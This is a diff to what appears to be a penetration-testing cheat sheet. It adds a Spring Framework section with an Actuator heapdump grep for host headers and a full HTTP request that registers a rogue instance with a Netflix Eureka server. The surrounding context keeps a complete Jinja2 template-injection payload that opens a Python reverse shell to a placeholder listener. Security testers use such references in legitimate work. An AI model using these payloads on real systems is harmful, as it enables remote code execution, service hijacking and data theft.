@@ -65,6 +65,7 @@
 - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
 - [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
 - [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
+- [Spring Framework](#spring-framework)
 - [Subdomain Takeover](#subdomain-takeover)
 - [Symfony](#symfony)
 - [unfurl](#unfurl)
@@ -5603,6 +5604,83 @@ ${{<%[%'"}}%\.
 
 ```console
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+## Spring Framework
+
+### Spring Boot Actuator
+
+> https://www.wiz.io/blog/spring-boot-actuator-misconfigurations
+
+> https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators
+
+#### heapdump
+
+```console
+$ strings heapdump | grep -E "^Host:\s+\S+$" -C 10
+```
+
+### Micro-Service Abuse
+
+> https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka
+
+```console
+POST /eureka/apps/WEBSERVICE HTTP/1.1
+Accept: application/json, application/*+json
+Accept-Encoding: gzip
+Content-Type: application/json
+User-Agent: Java/11.0.10
+Host: 127.0.0.1:8088
+Connection: keep-alive
+Content-Length: 1015
+
+{
+  "instance": {
+    "instanceId": "host.docker.internal:webservice:8082",
+    "app": "WEBSERVICE",
+    "appGroupName": null,
+    "ipAddr": "192.168.2.1",
+    "sid": "na",
+    "homePageUrl": "http://host.docker.internal:8082/",
+    "statusPageUrl": "http://host.docker.internal:8082/actuator/info",
+    "healthCheckUrl": "http://host.docker.internal:8082/actuator/health",
+    "secureHealthCheckUrl": null,
+    "vipAddress": "webservice",
+    "secureVipAddress": "webservice",
+    "countryId": 1,
+    "dataCenterInfo": {
+      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
+      "name": "MyOwn"
+    },
+    "hostName": "host.docker.internal",
+    "status": "UP",
+    "overriddenStatus": "UNKNOWN",
+    "leaseInfo": {
+      "renewalIntervalInSecs": 30,
+      "durationInSecs": 90,
+      "registrationTimestamp": 0,
+      "lastRenewalTimestamp": 0,
+      "evictionTimestamp": 0,
+      "serviceUpTimestamp": 0
+    },
+    "isCoordinatingDiscoveryServer": false,
+    "lastUpdatedTimestamp": 1630906180645,
+    "lastDirtyTimestamp": 1630906182808,
+    "actionType": null,
+    "asgName": null,
+    "port": {
+      "$": 8082,
+      "@enabled": "true"
+    },
+    "securePort": {
+      "$": 443,
+      "@enabled": "false"
+    },
+    "metadata": {
+      "management.port": "8082"
+    }
+  }
+}
 ```
 
 ## Subdomain Takeover
